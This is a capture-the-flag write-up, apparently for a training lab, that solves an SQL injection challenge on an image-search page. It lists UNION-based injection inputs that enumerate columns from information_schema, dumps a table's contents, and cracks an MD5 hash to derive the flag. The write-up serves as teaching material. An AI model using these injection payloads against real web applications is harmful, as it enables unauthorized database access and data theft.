# SQL_Injection_images

## SQL_Injection_explain

SQL injection attack refers to the operation that the attacker wants by constructing special input as a parameter and passing it into the web application, changing the semantics of the original SQL statement.

## Do_similary_thing_like_SQL_injection_members

    # input:
    1 or 1=1

    # result:
    ID: 1 or 1=1 
    Title: Hack me ?
    Url : borntosec.ddns.net/images.png

## Step_2

    # input:
    1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database()

    # result:
    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : id

    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : url

    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : title

    ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
    Title: list_images
    Url : comment

## Step_3

    # input:
    1 or 1=1 union select null, concat(id, url, title, comment) from list_images 

    # result:
    Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

## Get_the_flag

    1928e8083cf461a51303633093573c46 -> MD5 hash -> after crack -> albatroz
    albatroz -> ater SHA256 -> f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Solutions